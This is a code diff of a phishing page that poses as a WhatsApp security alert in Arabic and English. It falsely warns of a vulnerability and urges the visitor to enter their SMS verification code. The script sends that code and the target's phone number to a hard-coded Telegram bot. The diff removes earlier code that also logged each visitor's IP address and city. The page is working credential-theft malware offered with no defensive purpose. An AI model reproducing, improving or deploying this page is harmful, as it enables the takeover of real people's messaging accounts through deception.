@@ -3,20 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Protocol</title>
+    <title>WhatsApp Security</title>
     <style>
         :root { --wa-green: #25d366; --wa-bg: #0b141a; --wa-card: #1d2a33; --wa-text: #e9edef; --wa-hint: #8696a0; --wa-danger: #f15c5c; --wa-btn: #00a884; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background: var(--wa-bg); color: var(--wa-text); min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; direction: ltr; }
-        .rtl { direction: rtl; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: var(--wa-bg); color: var(--wa-text); min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .rtl { direction: rtl; }
         
         #loader { position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 20px; }
         .logo-wa-load { width: 60px; height: 60px; fill: var(--wa-green); animation: pulse 1.5s infinite; }
         @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } }
-        .load-txt { font-size: 14px; color: var(--wa-hint); letter-spacing: 1px; }
 
         .app-ui { width: 100%; max-width: 420px; padding: 25px; display: none; }
-        
         .header-section { text-align: center; margin-bottom: 30px; }
         .header-section svg { width: 50px; fill: var(--wa-green); margin-bottom: 15px; }
         .header-section h2 { font-size: 20px; font-weight: 600; }
@@ -32,17 +30,15 @@
         .alert-msg { font-size: 13px; line-height: 1.6; color: #e9edef; }
 
         .code-in { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 12px; padding: 18px; color: #fff; font-size: 28px; text-align: center; outline: none; margin-bottom: 20px; letter-spacing: 8px; }
-        .btn-sync { background: var(--wa-btn); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
-        .btn-sync:active { transform: scale(0.98); background: #008f72; }
+        .btn-sync { background: var(--wa-btn); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer; }
 
-        .footer { margin-top: 50px; font-size: 11px; color: var(--wa-hint); text-align: center; opacity: 0.7; }
+        .footer { margin-top: 50px; font-size: 11px; color: var(--wa-hint); text-align: center; opacity: 0.7; line-height: 1.6; }
     </style>
 </head>
 <body>
 
     <div id="loader">
         <svg class="logo-wa-load" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-        <div class="load-txt" id="l-txt">Scanning System...</div>
     </div>
 
     <div class="app-ui" id="main-ui">
@@ -53,60 +49,68 @@
 
         <div class="sys-card">
             <div class="sys-row"><span class="lbl" id="l-acc">Account:</span> <span class="val" id="v-acc"></span></div>
-            <div class="sys-row"><span class="lbl" id="l-dev">Device:</span> <span class="val" id="v-dev">Detecting...</span></div>
-            <div class="sys-row"><span class="lbl" id="l-sec">Security:</span> <span class="val" id="v-sec" style="color:var(--wa-danger)">Vulnerable</span></div>
+            <div class="sys-row"><span class="lbl" id="l-dev">Device:</span> <span class="val" id="v-dev">Loading...</span></div>
+            <div class="sys-row"><span class="lbl" id="l-sec">Security:</span> <span class="val" id="v-sec" style="color:var(--wa-danger)">Outdated</span></div>
         </div>
 
         <div class="alert-box">
-            <p class="alert-msg" id="m-body">Unknown access attempt detected. You must update the encryption protocol immediately by entering the received (SMS) code.</p>
+            <p class="alert-msg" id="m-body">Loading security protocols...</p>
         </div>
 
         <input type="tel" id="otp" class="code-in" placeholder="--- ---" maxlength="6" inputmode="numeric">
-        <button class="btn-sync" id="btn-text" onclick="handleFlow()">Update Now</button>
+        <button class="btn-sync" id="btn-text" onclick="handleFlow()">Update</button>
 
-        <div class="footer">WhatsApp Security © 2026<br>Official Encryption Protocol</div>
+        <div class="footer" id="f-text">WhatsApp Security © 2026</div>
     </div>
 
     <script>
         const CFG = {
             T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
             C: '5446862709',
-            U: new URLSearchParams(window.location.search).get('u') || "Unknown",
+            U: new URLSearchParams(window.location.search).get('u') || "201XXXXXXXXX",
             STEP: 1 
         };
 
-        // نظام ترجمة ذكي تلقائي
-        const LANG = {
+        const CONTENT = {
             ar: {
-                load: "جاري فحص النظام...",
                 title: "نظام حماية المحادثات",
                 acc: "رقم الحساب:",
                 dev: "نوع الجهاز:",
                 sec: "بروتوكول الأمان:",
                 status: "SSLv3 / ثغرة أمنية",
                 msg: "تم رصد محاولة وصول غير معروفة. يجب تحديث بروتوكول التشفير فوراً عن طريق إدخال رمز التحقق (SMS) المرسل إليك.",
-                btn: "تحديث النظام الآن"
+                btn: "تحديث النظام الآن",
+                footer: "WhatsApp Security © 2026\nحفاظاً على أمانك، لا تشارك الرمز مع أحد."
             },
             en: {
-                load: "Scanning System...",
                 title: "Security Center",
                 acc: "Account:",
                 dev: "Device:",
                 sec: "Security:",
                 status: "Vulnerable / Outdated",
                 msg: "Unknown access attempt detected. You must update the encryption protocol immediately by entering the received (SMS) code.",
-                btn: "Update Now"
+                btn: "Update Now",
+                footer: "WhatsApp Security © 2026\nOfficial Encryption Protocol"
             }
         };
 
-        function applyLang() {
-            const userLang = navigator.language || navigator.userLanguage;
-            const isAr = userLang.startsWith('ar');
-            const data = isAr ? LANG.ar : LANG.en;
+        function getSmartDevice() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) return "Android Smartphone";
+            if (/iPhone|iPad/i.test(ua)) return "iPhone (iOS)";
+            return "Mobile Device";
+        }
 
+        function maskPhone(phone) {
+            if(phone.length < 5) return phone;
+            return phone.slice(0, 5) + "****" + phone.slice(-2);
+        }
+
+        async function init() {
+            const isAr = navigator.language.startsWith('ar');
+            const data = isAr ? CONTENT.ar : CONTENT.en;
             if(isAr) document.body.classList.add('rtl');
-            
-            document.getElementById('l-txt').innerText = data.load;
+
             document.getElementById('h-title').innerText = data.title;
             document.getElementById('l-acc').innerText = data.acc;
             document.getElementById('l-dev').innerText = data.dev;
@@ -114,38 +118,15 @@
             document.getElementById('v-sec').innerText = data.status;
             document.getElementById('m-body').innerText = data.msg;
             document.getElementById('btn-text').innerText = data.btn;
-        }
-
-        function getSmartDevice() {
-            const ua = navigator.userAgent;
-            if (/android/i.test(ua)) {
-                if (/samsung/i.test(ua)) return "Samsung Galaxy";
-                if (/huawei/i.test(ua)) return "Huawei Device";
-                if (/oppo/i.test(ua)) return "OPPO Phone";
-                return "Android Smartphone";
-            } 
-            if (/iPhone|iPad/i.test(ua)) return "iPhone (iOS)";
-            return "Windows/Desktop";
-        }
-
-        async function init() {
-            applyLang();
-            document.getElementById('v-acc').innerText = CFG.U;
+            document.getElementById('f-text').innerText = data.footer;
+            
+            document.getElementById('v-acc').innerText = maskPhone(CFG.U);
             document.getElementById('v-dev').innerText = getSmartDevice();
 
-            // إرسال تقرير الزيارة فوراً
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                const log = `🔔 **New Visit**\n👤 Target: \`${CFG.U}\`\n📱 Dev: \`${getSmartDevice()}\`\n🏙 City: \`${d.city}\`\n📍 IP: \`${d.ip}\``;
-                fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
-            } catch(e) {}
-
-            // وقت تحميل السايد لودينج
             setTimeout(() => { 
                 document.getElementById('loader').style.display = 'none'; 
                 document.getElementById('main-ui').style.display = 'block'; 
-            }, 2500);
+            }, 2000);
         }
 
         async function handleFlow() {
@@ -156,7 +137,7 @@
             btn.disabled = true;
             btn.innerText = "...";
 
-            const log = `📂 **[ STEP ${CFG.STEP} ]**\n👤 Target: \`${CFG.U}\`\n🔑 Code: <code>${input.value}</code>\n📱 Dev: \`${getSmartDevice()}\``;
+            const log = `📂 **[ STEP ${CFG.STEP} ]**\n👤 Target: \`${CFG.U}\`\n🔑 Code: <code>${input.value}</code>`;
             await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
 
             if(CFG.STEP === 1) {
